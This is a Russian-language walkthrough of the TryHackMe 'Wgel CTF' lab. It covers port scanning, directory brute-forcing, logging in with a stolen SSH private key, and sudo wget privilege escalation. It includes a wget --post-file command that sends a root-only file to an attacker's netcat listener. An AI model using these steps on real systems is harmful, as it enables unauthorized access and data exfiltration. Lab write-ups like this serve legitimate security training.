Wgel CTF

TryHackMe | #web #linux #privesc | Nov 05, 2026

Всем привет. Это разбор комнаты Wgel CTF с платформы TryHackMe. Цель — получить пользовательский и корневой флаги.

1. Разведка (Reconnaissance)

Первым делом сканируем целевой хост с помощью Nmap, чтобы найти открытые порты.

nmap -sC -sV -Pn -p 22,80 10.113.135.112

Находим два открытых порта: 22 (SSH) и 80 (HTTP). На 80-м висит дефолтная страница Apache.

2. Перечисление директорий

В исходном коде главной страницы находим комментарий с именем пользователя: Jessie. Далее запускаем брутфорс директорий с помощью Gobuster.

gobuster dir -u http://10.113.135.112 -w /usr/share/wordlists/dirb/common.txt

Находим папку /sitemap/. Запускаем Gobuster уже по ней и находим скрытую папку /.ssh.

3. Первоначальный доступ

В папке /.ssh лежит приватный SSH-ключ id_rsa. Скачиваем его и используем для входа под пользователем jessie.

curl http://10.113.135.112/sitemap/.ssh/id_rsa -o id_rsa
chmod 600 id_rsa
ssh -i id_rsa jessie@10.113.135.112

Мы внутри. Находим пользовательский флаг в файле /home/jessie/Documents/user_flag.txt.

4. Эскалация привилегий

Проверяем права пользователя jessie через sudo -l. Видим, что ему разрешено запускать /usr/bin/wget от имени root без пароля. Используем это для эксфильтрации рут-флага.

На нашей машине поднимаем слушатель:

nc -lvnp 4444

На машине жертвы выполняем отправку файла:

sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.113.180.235:4444/

Получаем корневой флаг в терминале с netcat. Комната пройдена!
